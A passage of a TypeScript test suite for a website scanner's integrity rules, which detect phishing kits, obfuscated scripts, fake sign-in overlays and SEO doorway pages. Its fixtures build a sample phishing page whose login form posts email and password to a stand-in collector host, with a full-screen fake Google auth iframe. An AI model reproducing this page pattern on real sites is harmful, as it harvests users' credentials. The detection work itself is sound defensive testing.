// integrity — Phase A compromise heuristics (issue #116).
//
// Fixtures model the real sydneyavspecialists incident:
//   - POSITIVE: a token-gated Calendly credential kit (off-theme standalone page
//     + obfuscated inline payload + #google-auth full-viewport overlay), and an
//     injected affiliate doorway post.
//   - NEGATIVE: a clean themed page from the SAME site (must NOT flag), and a
//     legit SaaS page that merely *mentions* Calendly as an integration (must NOT
//     trip brand-impersonation).
//
// The correlation gating is the crux: the kit page fires multiple signals → high
// severity (`fail`); the negatives fire zero or one → never `fail`.

import { describe, expect, test } from "bun:test";

import type { CheckResult } from "@squirrelscan/core-contracts";

import { parsePage } from "@squirrelscan/parser";

import { brandImpersonationRule } from "../src/integrity/brand-impersonation";
import { fakeAuthOverlayRule } from "../src/integrity/fake-auth-overlay";
import { obfuscatedScriptRule } from "../src/integrity/obfuscated-script";
import { orphanPageRule } from "../src/integrity/orphan-page";
import { seoDoorwayRule } from "../src/integrity/seo-doorway";
import { templateDiscontinuityRule } from "../src/integrity/template-discontinuity";
import {
  detectPageSignals,
  detectBrandImpersonation,
  detectObfuscatedScript,
  detectFakeAuthOverlay,
  detectSeoDoorway,
} from "../src/integrity/signals";
import type { ParsedPage, Rule, RuleContext, SiteData } from "../src/types";

const SITE = "https://sydneyavspecialists.com.au";

// ── Fixtures ─────────────────────────────────────────────────────────

// Shared theme markup: same stylesheet, same CDN host, nav + footer, body class.
function themed(title: string, body: string): string {
  return `<!DOCTYPE html><html><head>
    <title>${title}</title>
    <link rel="stylesheet" href="https://cdn.sydneyav.com/theme/style.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto">
    <script src="https://cdn.sydneyav.com/theme/app.js"></script>
    <style>:root{--brand-color:#0a5;--brand-spacing:8px;--brand-font:Roboto;}</style>
  </head>
  <body class="wp-theme sydneyav home page-template">
    <nav class="main-nav"><a href="/">Home</a><a href="/services">Services</a><a href="/about">About</a></nav>
    <main>${body}</main>
    <footer class="site-footer"><img src="https://cdn.sydneyav.com/logo.png" alt="logo">© Sydney AV</footer>
  </body></html>`;
}

const CLEAN_BODY = `<p>${Array.from({ length: 240 }, (_, i) => `audiovisual hire word${i}`).join(" ")}</p>`;

// A genuinely off-brand obfuscated inline payload: large, high-entropy, eval +
// anti-tamper. Built from random-ish hex to push Shannon entropy high.
function obfuscatedPayload(): string {
  let s = 'var _0x1a2b=function(){return "the code has been tampered!";};eval(atob("';
  // ~8KB of base64-ish high-entropy chars
  const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  let seed = 1337;
  for (let i = 0; i < 8200; i++) {
    seed = (seed * 1103515245 + 12345) & 0x7fffffff;
    // Use the HIGH bits — low bits of an LCG have a short period (would collapse
    // to a near-constant char and tank the entropy we're trying to simulate).
    s += alphabet[(seed >> 16) % alphabet.length];
  }
  s += '"));String.fromCharCode(104,105);';
  return s;
}

// POSITIVE — the kit page: bare standalone doc (no theme), Calendly title +
// "Sign in with Google", off-origin form, full-viewport #google-auth iframe, and
// a large obfuscated inline script.
function kitPageHtml(): string {
  return `<!DOCTYPE html><html><head>
    <title>Discovery Call · Calendly (Updated)</title>
    <script>${obfuscatedPayload()}</script>
  </head>
  <body>
    <iframe id="google-auth" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;border:0" src="https://verify-account.tk/login"></iframe>
    <div>Sign in with Google to confirm your Calendly discovery call.</div>
    <form action="https://evil-collector.tk/grab" method="post">
      <input type="email" name="email">
      <input type="password" name="password">
      <button>Sign in</button>
    </form>
    <a href="https://accounts-google.tk/oauth">Sign in with Google</a>
  </body></html>`;
}

// POSITIVE — injected affiliate doorway post (themed enough to pass template, but
// off-topic keyword-stuffed body). Detected via doorway lexicon + thin/stuffed.
function doorwayPageHtml(): string {
  const stuffed = Array.from(
    { length: 40 },
    () => "clickfunnels kajabi affiliate sales funnel"
  ).join(" ");
  return themed(
    "Calendly ClickFunnels 2.0 (5 HELPFUL TIPS) - Best Sales Funnel",
    `<article><h1>Calendly ClickFunnels 2.0 affiliate review</h1><p>${stuffed}</p></article>`
  );
}

// NEGATIVE — legit SaaS integrations page that mentions Calendly. Themed, links
// to the real calendly.com, no credential surface.
function legitCalendlyPageHtml(): string {
  return themed(
    "Calendly Integration - Sydney AV Booking",
    `<article><h1>Book a call via our Calendly integration</h1>
     <p>${CLEAN_BODY}</p>
     <p>We use <a href="https://calendly.com/sydneyav">Calendly</a> to schedule discovery calls. Click below to book a call.</p>
     <a href="https://calendly.com/sydneyav/discovery">Schedule on Calendly</a></article>`
  );
}

// ── Helpers ──────────────────────────────────────────────────────────

function pageEntry(
  url: string,
  html: string,
  statusCode = 200
): SiteData["pages"][number] {
  return { url, statusCode, parsed: parsePage(html, url) };
}

function pageCtx(
  url: string,
  html: string,
  site?: SiteData
): RuleContext {
  const parsed = parsePage(html, url);
  return {
    page: { url, html, statusCode: 200, loadTime: 0, headers: {}, parsed },
    parsed,
    site,
    options: {},
  };
}

function siteCtx(pages: SiteData["pages"], opts?: {
  sitemapLocs?: string[];
  options?: Record<string, unknown>;
  crawlLimits?: { pagesCrawled: number; maxPages: number };
}): RuleContext {
  const site: SiteData = {
    baseUrl: SITE,
    pages,
    robotsTxt: null,
    ...(opts?.crawlLimits ? { crawlLimits: opts.crawlLimits } : {}),
    sitemaps: opts?.sitemapLocs
      ? {
          discovered: [
            {
              url: `${SITE}/sitemap.xml`,
              type: "urlset",
              urls: opts.sitemapLocs.map((loc) => ({ loc })),
              childSitemaps: [],
              errors: [],
              urlCount: opts.sitemapLocs.length,
            },
          ],
          sources: { robotsTxt: [], commonLocations: [] },
          totalUrls: opts.sitemapLocs.length,
          orphanPages: [],
          missingPages: [],
          failed: [],
        }
      : null,
  };
  return {
    page: {
      url: pages[0]?.url ?? SITE,
      html: "",
      statusCode: 200,
      loadTime: 0,
      headers: {},
    },
    parsed: pages[0]?.parsed ?? ({} as ParsedPage),
    site,
    options: opts?.options ?? {},
  };
}

// Mirror the runner: apply the rule's optionsSchema defaults before running, so
// site rules see their default minPages/threshold (the runner does this via
// getRuleOptions; calling rule.run directly would otherwise leave options unset).
function run(rule: Rule, ctx: RuleContext): CheckResult[] {
  const schema = rule.meta.optionsSchema;
  const options = schema ? schema.parse(ctx.options ?? {}) : ctx.options;
  return (rule.run({ ...ctx, options }) as { checks: CheckResult[] }).checks;
}
function find(checks: CheckResult[], name: string): CheckResult | undefined {
  return checks.find((c) => c.name === name);
}

// Build a realistic site: 4 clean themed pages + the kit + the doorway.
function fullSitePages(): SiteData["pages"] {
  return [
    pageEntry(`${SITE}/`, themed("Home - Sydney AV", CLEAN_BODY)),
    pageEntry(`${SITE}/services`, themed("Services - Sydney AV", CLEAN_BODY)),
    pageEntry(`${SITE}/about`, themed("About - Sydney AV", CLEAN_BODY)),
    pageEntry(`${SITE}/contact`, themed("Contact - Sydney AV", CLEAN_BODY)),
    pageEntry(`${SITE}/calendly?token=ey4m`, kitPageHtml()),
    pageEntry(`${SITE}/blog/calendly-clickfunnels-tips`, doorwayPageHtml()),
  ];
}

// ── Signal-level detectors ───────────────────────────────────────────

describe("integrity/signals — individual detectors", () => {
  test("kit page fires brand-impersonation, obfuscated-script, fake-auth-overlay", () => {
    const ctx = pageCtx(`${SITE}/calendly?token=ey4m`, kitPageHtml());
    expect(detectBrandImpersonation(ctx)).not.toBeNull();
    expect(detectObfuscatedScript(ctx)).not.toBeNull();
    expect(detectFakeAuthOverlay(ctx)).not.toBeNull();
    const signals = detectPageSignals(ctx);
    expect(signals.size).toBeGreaterThanOrEqual(2);
  });

  test("doorway page fires seo-doorway", () => {
    const ctx = pageCtx(`${SITE}/blog/x`, doorwayPageHtml());
    expect(detectSeoDoorway(ctx)).not.toBeNull();
  });

  test("legit Calendly page fires NO brand-impersonation", () => {
    const ctx = pageCtx(`${SITE}/integrations`, legitCalendlyPageHtml());
    expect(detectBrandImpersonation(ctx)).toBeNull();
  });

  test("clean themed page fires zero signals", () => {
    const ctx = pageCtx(`${SITE}/about`, themed("About", CLEAN_BODY));
    expect(detectPageSignals(ctx).size).toBe(0);
  });

  test("legit page mentioning Calendly fires zero signals", () => {
    const ctx = pageCtx(`${SITE}/integrations`, legitCalendlyPageHtml());
    expect(detectPageSignals(ctx).size).toBe(0);
  });
});

// ── brand-impersonation rule (correlation gating) ────────────────────

describe("integrity/brand-impersonation", () => {
  test("kit page → fail (>=2 corroborating signals)", () => {
    const checks = run(
      brandImpersonationRule,
      pageCtx(`${SITE}/calendly`, kitPageHtml())
    );
    const c = find(checks, "brand-impersonation");
    expect(c?.status).toBe("fail");
    expect(c?.details?.escalated).toBe(true);
  });

  test("legit Calendly integration page → no finding", () => {
    const checks = run(
      brandImpersonationRule,
      pageCtx(`${SITE}/integrations`, legitCalendlyPageHtml())
    );
    expect(find(checks, "brand-impersonation")).toBeUndefined();
  });

  test("clean themed page → no finding", () => {
    const checks = run(
      brandImpersonationRule,
      pageCtx(`${SITE}/about`, themed("About", CLEAN_BODY))
    );
    expect(find(checks, "brand-impersonation")).toBeUndefined();
  });

  test("single brand signal alone → info, not fail", () => {
    // ONLY a brand-labeled off-brand "Sign in with Google" link — no overlay
    // iframe, no obfuscated script. Exactly one integrity signal → info.
    const html = `<!DOCTYPE html><html><head><title>Calendly Login</title></head>
      <body><p>Continue to your Calendly account.</p>
      <a href="https://accounts-google.tk/oauth">Sign in with Google</a></body></html>`;
    const ctx = pageCtx(`${SITE}/x`, html);
    const signals = detectPageSignals(ctx);
    expect(signals.size).toBe(1);
    const c = find(run(brandImpersonationRule, ctx), "brand-impersonation");
    expect(c?.status).toBe("info");
    expect(c?.details?.escalated).toBe(false);
  });
});

// ── obfuscated-script rule ───────────────────────────────────────────

describe("integrity/obfuscated-script", () => {
  test("kit page → fail (corroborated)", () => {
    const c = find(
      run(obfuscatedScriptRule, pageCtx(`${SITE}/calendly`, kitPageHtml())),
      "obfuscated-script"
    );
    expect(c?.status).toBe("fail");
  });

  test("clean themed page with normal scripts → no finding", () => {
    const c = find(
      run(obfuscatedScriptRule, pageCtx(`${SITE}/about`, themed("About", CLEAN_BODY))),
      "obfuscated-script"
    );
    expect(c).toBeUndefined();
  });

  test("lone obfuscated script (no other signals) → info", () => {
    const html = `<!DOCTYPE html><html><head><title>Page</title>
      <script>${obfuscatedPayload()}</script></head>
      <body><p>${CLEAN_BODY}</p></body></html>`;
    const c = find(
      run(obfuscatedScriptRule, pageCtx(`${SITE}/x`, html)),
      "obfuscated-script"
    );
    expect(c?.status).toBe("info");
  });
});

// ── fake-auth-overlay rule ───────────────────────────────────────────

describe("integrity/fake-auth-overlay", () => {
  test("kit page full-viewport #google-auth iframe → fail (corroborated)", () => {
    const c = find(
      run(fakeAuthOverlayRule, pageCtx(`${SITE}/calendly`, kitPageHtml())),
      "fake-auth-overlay"
    );
    expect(c?.status).toBe("fail");
  });

  test("normal fixed cookie-banner iframe → no finding", () => {
    const html = themed(
      "Home",
      `${CLEAN_BODY}<iframe style="position:fixed;bottom:0;left:0;width:100%;height:60px;z-index:5" src="https://cdn.sydneyav.com/cookie.html"></iframe>`
    );
    const c = find(
      run(fakeAuthOverlayRule, pageCtx(`${SITE}/`, html)),
      "fake-auth-overlay"
    );
    expect(c).toBeUndefined();
  });
});

// ── seo-doorway rule ─────────────────────────────────────────────────

describe("integrity/seo-doorway", () => {
  test("doorway page → finding", () => {
    const c = find(
      run(seoDoorwayRule, pageCtx(`${SITE}/blog/x`, doorwayPageHtml())),
      "seo-doorway"
    );
    expect(c).toBeDefined();
  });

  test("legit Calendly page → no doorway finding", () => {
    const c = find(
      run(seoDoorwayRule, pageCtx(`${SITE}/integrations`, legitCalendlyPageHtml())),
      "seo-doorway"
    );
    expect(c).toBeUndefined();
  });

  test("single 'affiliate disclosure' mention → no finding", () => {
    const html = themed(
      "Honest Audiovisual Gear Review",
      `<article><h1>AV gear review</h1><p>${CLEAN_BODY}</p>
       <p>This post contains affiliate links (affiliate disclosure).</p></article>`
    );
    const c = find(
      run(seoDoorwayRule, pageCtx(`${SITE}/blog/review`, html)),
      "seo-doorway"
    );
    expect(c).toBeUndefined();
  });
});

// ── template-discontinuity rule (site-scope) ─────────────────────────

describe("integrity/template-discontinuity", () => {
  test("kit page diverges from theme + carries signals → warn", () => {
    // #2233 — still escalated (it shares none of the site's assets and carries
    // page-level signals), but a warning rather than a failure: the evidence is
    // a similarity score plus a heuristic, which is enough to ask someone to
    // look and not enough to zero a category.
    const ctx = siteCtx(fullSitePages());
    const c = find(run(templateDiscontinuityRule, ctx), "template-discontinuity");
    expect(c?.status).toBe("warn");
    const outliers = (c?.details?.outliers as { url: string }[]) ?? [];
    expect(outliers.some((o) => o.url.includes("/calendly"))).toBe(true);
  });

  // #2233 — a signed-out or empty-state page on the site's own host renders a
  // different shell but still pulls the site's own assets. It is the site's
  // page, and calling it injected was a false positive on a real site.
  test("an off-template page that loads the site's own assets is never escalated", () => {
    // A different shell (its own stylesheet, no nav, no footer, none of the
    // theme's classes or variables) but it still pulls the theme's stylesheet
    // from the site's own CDN. Similarity lands under the threshold; the shared
    // stylesheet is the whole point.
    const signedOut = `<!DOCTYPE html><html><head>
      <title>Your saved items</title>
      <link rel="stylesheet" href="https://cdn.sydneyav.com/theme/style.css">
      <link rel="stylesheet" href="https://unrelated-cdn.tk/lp.css">
      <script>${obfuscatedPayload()}</script>
    </head><body class="signed-out">
      <div>Sign in to see your items.</div>
    </body></html>`;
    const pages = [
      pageEntry(`${SITE}/`, themed("Home", CLEAN_BODY)),
      pageEntry(`${SITE}/services`, themed("Services", CLEAN_BODY)),
      pageEntry(`${SITE}/about`, themed("About", CLEAN_BODY)),
      pageEntry(`${SITE}/contact`, themed("Contact", CLEAN_BODY)),
      pageEntry(`${SITE}/account/items`, signedOut),
    ];
    const checks = run(templateDiscontinuityRule, siteCtx(pages));
    expect(checks.find((c) => c.name === "template-discontinuity")).toBeUndefined();
    const review = find(checks, "template-discontinuity-review");
    expect(review?.status).toBe("info");
    const outliers = (review?.details?.outliers as { url: string; loadsSiteAssets: boolean; signals: number }[]) ?? [];
    const page = outliers.find((o) => o.url.includes("/account/items"));
    // It carries a signal AND it is still not escalated: the assets are why.
    expect(page?.signals).toBeGreaterThanOrEqual(1);
    expect(page?.loadsSiteAssets).toBe(true);
  });

  test("the same page carrying nothing of the site's own is escalated", () => {
    // Identical but for the stylesheet: this is what an injected standalone
    // page looks like, and it still reports.
    const standalone = `<!DOCTYPE html><html><head>
      <title>Your saved items</title>
      <link rel="stylesheet" href="https://unrelated-cdn.tk/lp.css">
      <script>${obfuscatedPayload()}</script>
    </head><body class="signed-out">
      <img src="https://unrelated-cdn.tk/logo.png" alt="logo">
      <div>Sign in to see your items.</div>
    </body></html>`;
    const pages = [
      pageEntry(`${SITE}/`, themed("Home", CLEAN_BODY)),
      pageEntry(`${SITE}/services`, themed("Services", CLEAN_BODY)),
      pageEntry(`${SITE}/about`, themed("About", CLEAN_BODY)),
      pageEntry(`${SITE}/contact`, themed("Contact", CLEAN_BODY)),
      pageEntry(`${SITE}/account/items`, standalone),
    ];
    const c = find(run(templateDiscontinuityRule, siteCtx(pages)), "template-discontinuity");
    expect(c?.status).toBe("warn");
    const outliers = (c?.details?.outliers as { loadsSiteAssets: boolean }[]) ?? [];
    expect(outliers[0]?.loadsSiteAssets).toBe(false);
  });

  test("the finding does not assert that the page is injected", () => {
    const c = find(run(templateDiscontinuityRule, siteCtx(fullSitePages())), "template-discontinuity");
    expect(c?.message).not.toMatch(/injected|compromise signals/i);
    expect(c?.message).toContain("share none of the site's assets");
  });

  test("the solution asks the reader to confirm the page before anything else", () => {
    const solution = templateDiscontinuityRule.meta.solution ?? "";
    // The compromise instruction must be reached only through a condition, and
    // the condition has to come first.
    expect(solution).toContain("confirming the page is one you published");
    expect(solution.indexOf("confirming the page is one you published")).toBeLessThan(
      solution.indexOf("treat the site as compromised")
    );
    expect(solution).toContain("only then");
  });

  test("all-themed site → pass", () => {
    const pages = [
      pageEntry(`${SITE}/`, themed("Home", CLEAN_BODY)),
      pageEntry(`${SITE}/services`, themed("Services", CLEAN_BODY)),
      pageEntry(`${SITE}/about`, themed("About", CLEAN_BODY)),
      pageEntry(`${SITE}/contact`, themed("Contact", CLEAN_BODY)),
    ];
    const c = find(
      run(templateDiscontinuityRule, siteCtx(pages)),
      "template-discontinuity"
    );
    expect(c?.status).toBe("pass");
  });

  test("too few pages → skipped", () => {
    const pages = [pageEntry(`${SITE}/`, themed("Home", CLEAN_BODY))];
    const c = find(
      run(templateDiscontinuityRule, siteCtx(pages)),
      "template-discontinuity"
    );
    expect(c?.status).toBe("skipped");
  });
});

// ── orphan-page rule (site-scope) ────────────────────────────────────

describe("integrity/orphan-page", () => {
  test("hidden kit page (no sitemap entry, no inbound links) + signals → fail", () => {
    // Sitemap lists only the legit pages; kit page is absent + nothing links it.
    const pages = fullSitePages();
    const sitemapLocs = [
      `${SITE}/`,
      `${SITE}/services`,
      `${SITE}/about`,
      `${SITE}/contact`,
    ];
    const c = find(
      run(orphanPageRule, siteCtx(pages, { sitemapLocs })),
      "orphan-page"
    );
    expect(c?.status).toBe("fail");
    const items = (c?.items ?? []).map((i) => i.id);
    expect(items.some((u) => u.includes("/calendly"))).toBe(true);
  });

  test("all pages linked + in sitemap → pass", () => {
    const home = themed(
      "Home",
      `${CLEAN_BODY}<a href="/services">Services</a><a href="/about">About</a>`
    );
    const pages = [
      pageEntry(`${SITE}/`, home),
      pageEntry(`${SITE}/services`, themed("Services", CLEAN_BODY)),
      pageEntry(`${SITE}/about`, themed("About", CLEAN_BODY)),
    ];
    const sitemapLocs = [`${SITE}/`, `${SITE}/services`, `${SITE}/about`];
    const c = find(
      run(orphanPageRule, siteCtx(pages, { sitemapLocs })),
      "orphan-page"
    );
    expect(c?.status).toBe("pass");
  });

  // No sitemap discovered → absence-from-sitemap is meaningless, so the rule
  // falls back to the zero-inbound-links criterion alone. A hidden kit page
  // carrying signals still escalates; the homepage is exempt.
  test("no sitemap: hidden kit page (zero inbound) + signals → fail", () => {
    const home = themed(
      "Home",
      `${CLEAN_BODY}<a href="/services">Services</a><a href="/about">About</a>`
    );
    const pages = [
      pageEntry(`${SITE}/`, home),
      pageEntry(`${SITE}/services`, themed("Services", CLEAN_BODY)),
      pageEntry(`${SITE}/about`, themed("About", CLEAN_BODY)),
      pageEntry(`${SITE}/calendly?token=ey4m`, kitPageHtml()), // hidden, signals
    ];
    const checks = run(orphanPageRule, siteCtx(pages)); // no sitemapLocs → hasSitemap=false
    const c = find(checks, "orphan-page");
    expect(c?.status).toBe("fail");
    expect((c?.items ?? []).some((i) => i.id.includes("/calendly"))).toBe(true);
    expect(c?.details?.hasSitemap).toBe(false);
  });
});

// ── end-to-end: the incident would be caught, negatives spared ───────

describe("integrity — incident corpus end-to-end", () => {
  test("kit page produces at least 3 fail-level integrity findings across rules", () => {
    const site = siteCtx(fullSitePages(), {
      sitemapLocs: [`${SITE}/`, `${SITE}/services`, `${SITE}/about`, `${SITE}/contact`],
    }).site!;
    const kitCtx = pageCtx(`${SITE}/calendly?token=ey4m`, kitPageHtml(), site);

    const pageFindings = [
      ...run(brandImpersonationRule, kitCtx),
      ...run(obfuscatedScriptRule, kitCtx),
      ...run(fakeAuthOverlayRule, kitCtx),
    ].filter((c) => c.status === "fail");
    expect(pageFindings.length).toBeGreaterThanOrEqual(3);

    // Site-scope rules also flag it.
    const siteCtxFull = siteCtx(fullSitePages(), {
      sitemapLocs: [`${SITE}/`, `${SITE}/services`, `${SITE}/about`, `${SITE}/contact`],
    });
    expect(
      find(run(templateDiscontinuityRule, siteCtxFull), "template-discontinuity")
        ?.status
    ).toBe("warn"); // #2233: escalated, but a warning rather than a failure
    expect(
      find(run(orphanPageRule, siteCtxFull), "orphan-page")?.status
    ).toBe("fail");
  });

  test("legit Calendly page + clean pages produce NO fail-level integrity findings", () => {
    const site = siteCtx([
      pageEntry(`${SITE}/`, themed("Home", CLEAN_BODY)),
      pageEntry(`${SITE}/integrations`, legitCalendlyPageHtml()),
      pageEntry(`${SITE}/about`, themed("About", CLEAN_BODY)),
    ]).site!;
    const legitCtx = pageCtx(`${SITE}/integrations`, legitCalendlyPageHtml(), site);

    const allFindings = [
      ...run(brandImpersonationRule, legitCtx),
      ...run(obfuscatedScriptRule, legitCtx),
      ...run(fakeAuthOverlayRule, legitCtx),
      ...run(seoDoorwayRule, legitCtx),
    ];
    expect(allFindings.filter((c) => c.status === "fail").length).toBe(0);
    expect(allFindings.filter((c) => c.status === "info").length).toBe(0);
  });
});

// ── false-positive regressions (codex review findings) ───────────────

describe("integrity — false-positive regressions", () => {
  // Finding 1: only the CREDENTIAL SURFACE destinations count — an unrelated
  // footer/social link must not be read as where credentials go.
  test("legit 'Sign in with Google' page + footer Twitter link → no brand-impersonation", () => {
    const html = themed(
      "Sign in - Sydney AV",
      `<article><h1>Sign in</h1><p>${CLEAN_BODY}</p>
       <a href="https://accounts.google.com/o/oauth2/v2/auth?client_id=x">Sign in with Google</a>
       <a href="https://twitter.com/sydneyav">Follow us on Twitter</a>
       <a href="https://linkedin.com/company/sydneyav">LinkedIn</a></article>`
    );
    const ctx = pageCtx(`${SITE}/login`, html);
    expect(detectBrandImpersonation(ctx)).toBeNull();
    expect(
      find(run(brandImpersonationRule, ctx), "brand-impersonation")
    ).toBeUndefined();
  });

  // Finding 1c: a SaaS marketing page whose "Sign in" points at its OWN app
  // subdomain (same registrable domain) while mentioning Calendly must not flag.
  test("SaaS page: 'Sign in' → app subdomain + Calendly mention → no brand-impersonation", () => {
    const html = `<!DOCTYPE html><html><head><title>Acme - Scheduling that syncs with Calendly</title>
      <link rel="canonical" href="https://www.acme.com/features/calendly"></head>
      <body><h1>Calendly integration</h1>
      <p>Acme syncs your bookings with Calendly. Sign in to get started.</p>
      <a href="https://app.acme.com/login">Sign in</a>
      <a href="https://calendly.com/integrations/acme">View on Calendly</a></body></html>`;
    const ctx = pageCtx("https://www.acme.com/features/calendly", html);
    expect(detectBrandImpersonation(ctx)).toBeNull();
    expect(detectPageSignals(ctx).size).toBe(0);
  });

  // Finding 1b: a self-hosted login form (password posts to own origin) that
  // offers Google SSO to accounts.google.com must not flag.
  test("self-hosted login form + real Google SSO → no brand-impersonation", () => {
    const html = themed(
      "Account Login - Sydney AV",
      `<h1>Log in to your account</h1>
       <form action="/auth/session" method="post">
         <input type="email" name="email"><input type="password" name="password">
         <button>Log in</button>
       </form>
       <a href="https://accounts.google.com/o/oauth2/auth">Sign in with Google</a>`
    );
    expect(detectBrandImpersonation(pageCtx(`${SITE}/login`, html))).toBeNull();
  });

  // Finding 2: a legitimate full-page app-shell iframe pointing at the SAME
  // origin (no auth identifier, no off-self src) must not fire fake-auth-overlay.
  test("legit full-page self-hosted app-shell iframe → no fake-auth-overlay", () => {
    const html = themed(
      "App - Sydney AV",
      `${CLEAN_BODY}<iframe id="app-shell" class="embed" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:1000;border:0" src="https://sydneyavspecialists.com.au/app/embed"></iframe>`
    );
    const ctx = pageCtx(`${SITE}/app`, html);
    expect(detectFakeAuthOverlay(ctx)).toBeNull();
    expect(
      find(run(fakeAuthOverlayRule, ctx), "fake-auth-overlay")
    ).toBeUndefined();
  });

  // Finding 2b: off-self full-page iframe WITHOUT page auth copy and WITHOUT an
  // auth identifier (e.g. a full-screen video/map embed) must not fire.
  test("off-self full-page embed without auth intent → no fake-auth-overlay", () => {
    const html = themed(
      "Virtual Tour - Sydney AV",
      `${CLEAN_BODY}<iframe id="tour" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;border:0" src="https://player.vimeo.com/video/12345"></iframe>`
    );
    expect(detectFakeAuthOverlay(pageCtx(`${SITE}/tour`, html))).toBeNull();
  });

  // Finding 3: a legitimate off-theme landing page (template outlier with NO
  // page-level compromise signals) must be reported as `info` review-only, NOT
  // folded into a high-severity `fail`.
  test("legit off-theme landing page → template-discontinuity info, not fail", () => {
    // 4 themed pages + 1 off-theme but otherwise-clean landing page.
    const landing = `<!DOCTYPE html><html><head><title>Special Promo Landing</title>
      <link rel="stylesheet" href="https://promo-cdn.example.com/lp.css"></head>
      <body class="lp-bare"><h1>Limited offer</h1><p>${CLEAN_BODY}</p></body></html>`;
    const pages = [
      pageEntry(`${SITE}/`, themed("Home", CLEAN_BODY)),
      pageEntry(`${SITE}/services`, themed("Services", CLEAN_BODY)),
      pageEntry(`${SITE}/about`, themed("About", CLEAN_BODY)),
      pageEntry(`${SITE}/contact`, themed("Contact", CLEAN_BODY)),
      pageEntry(`${SITE}/promo`, landing),
    ];
    const checks = run(templateDiscontinuityRule, siteCtx(pages));
    // No fail-level finding (the outlier carries no page-level signals).
    expect(checks.find((c) => c.name === "template-discontinuity")).toBeUndefined();
    const review = find(checks, "template-discontinuity-review");
    expect(review?.status).toBe("info");
    expect((review?.items ?? []).some((i) => i.id.includes("/promo"))).toBe(true);
  });

  // Finding 3b: a hidden page with no compromise signals → orphan-page-review
  // info, not fail.
  test("legit hidden page (no signals) → orphan-page info, not fail", () => {
    const pages = [
      pageEntry(`${SITE}/`, themed("Home", `${CLEAN_BODY}<a href="/about">About</a>`)),
      pageEntry(`${SITE}/about`, themed("About", CLEAN_BODY)),
      pageEntry(`${SITE}/unlisted`, themed("Unlisted Page", CLEAN_BODY)), // hidden, clean
    ];
    const sitemapLocs = [`${SITE}/`, `${SITE}/about`];
    const checks = run(orphanPageRule, siteCtx(pages, { sitemapLocs }));
    expect(checks.find((c) => c.name === "orphan-page")).toBeUndefined();
    const review = find(checks, "orphan-page-review");
    expect(review?.status).toBe("info");
  });
});

// ── multi-label TLD self/same-site detection (#144) ──────────────────
//
// The naive "last two labels" registrable-domain proxy collapsed multi-label
// public suffixes (`com.au`, `co.uk`, …) to the suffix itself, so EVERY host on
// such a TLD looked like the site's own surface and brand-impersonation was
// suppressed — precisely on the `.com.au` class of domain the incident
// (`sydneyavspecialists.com.au`) belongs to. The registrable domain (eTLD+1) is
// now resolved against the real Public Suffix List (via `tldts`), which handles
// every ccTLD second-level AND deeper tiers (`nsw.edu.au`, …) the earlier curated
// ~50-entry table could not represent.
describe("integrity/brand-impersonation — multi-label TLDs (#144)", () => {
  // A page whose brand-labeled "Sign in" control posts to an UNRELATED
  // registrable domain that happens to share the same multi-label public suffix.
  function offBrandPage(siteHost: string, attackerHost: string): string {
    return `<!DOCTYPE html><html><head>
      <title>Discovery Call · Calendly</title></head>
      <body>
      <p>Sign in with Google to confirm your Calendly discovery call.</p>
      <a href="https://${attackerHost}/oauth">Sign in with Google</a>
      </body></html>`;
  }

  test(".com.au site → off-brand .com.au sign-in IS flagged (no suffix suppression)", () => {
    // victim.com.au vs evil.com.au share `com.au` but are different sites — the
    // old code returned `com.au` for both → suppressed. Now flagged.
    const ctx = pageCtx(
      "https://victim.com.au/login",
      offBrandPage("victim.com.au", "evil.com.au")
    );
    const hit = detectBrandImpersonation(ctx);
    expect(hit).not.toBeNull();
    expect(hit?.brand).toBe("Google");
    expect(hit?.reason).toContain("evil.com.au");
  });

  test(".co.uk site → off-brand .co.uk sign-in IS flagged", () => {
    const ctx = pageCtx(
      "https://victim.co.uk/login",
      offBrandPage("victim.co.uk", "phish.co.uk")
    );
    const hit = detectBrandImpersonation(ctx);
    expect(hit).not.toBeNull();
    expect(hit?.reason).toContain("phish.co.uk");
  });

  test("incident TLD: sydneyavspecialists.com.au → off-brand .com.au flagged", () => {
    // The exact TLD class the feature exists for: a kit on a .com.au site
    // pointing its Calendly "Sign in" at a different .com.au attacker host.
    const ctx = pageCtx(
      `${SITE}/calendly`,
      offBrandPage("sydneyavspecialists.com.au", "calendly-secure.com.au")
    );
    const hit = detectBrandImpersonation(ctx);
    expect(hit).not.toBeNull();
    expect(hit?.reason).toContain("calendly-secure.com.au");
  });

  // The same-site control is BRAND-LABELED ("Sign in with Google") and targets a
  // sibling subdomain on the SAME registrable domain — this is the path
  // `isSelfOrSameSite` must spare. A bare "Sign in" would be filtered out by
  // `credentialDestinations` before the self-check runs and wouldn't test it.
  test("genuine same-registrable subdomain on .com.au → NOT flagged (no FP)", () => {
    // www.victim.com.au → app.victim.com.au is the site's own surface: same
    // registrable domain (victim.com.au), must still be treated as self.
    const html = `<!DOCTYPE html><html><head>
      <title>Victim Co - Scheduling that syncs with Calendly</title>
      <link rel="canonical" href="https://www.victim.com.au/features"></head>
      <body><h1>Calendly integration</h1>
      <p>Sign in with Google to get started with Calendly.</p>
      <a href="https://app.victim.com.au/login">Sign in with Google</a></body></html>`;
    const ctx = pageCtx("https://www.victim.com.au/features", html);
    expect(detectBrandImpersonation(ctx)).toBeNull();
    expect(detectPageSignals(ctx).size).toBe(0);
  });

  test("same-registrable subdomain on .co.uk → NOT flagged (no FP)", () => {
    const html = `<!DOCTYPE html><html><head>
      <title>Acme UK - Calendly scheduling</title>
      <link rel="canonical" href="https://www.acme.co.uk/features"></head>
      <body><h1>Calendly integration</h1>
      <p>Sign in with Google to get started with Calendly.</p>
      <a href="https://app.acme.co.uk/login">Sign in with Google</a></body></html>`;
    const ctx = pageCtx("https://www.acme.co.uk/features", html);
    expect(detectBrandImpersonation(ctx)).toBeNull();
    expect(detectPageSignals(ctx).size).toBe(0);
  });

  test("ordinary .com same-registrable subdomain still treated as self", () => {
    // Regression guard for the gTLD path the fix must not break.
    const html = `<!DOCTYPE html><html><head>
      <title>Acme - Calendly scheduling</title>
      <link rel="canonical" href="https://www.acme.com/features"></head>
      <body><h1>Calendly integration</h1>
      <p>Sign in with Google to get started with Calendly.</p>
      <a href="https://app.acme.com/login">Sign in with Google</a></body></html>`;
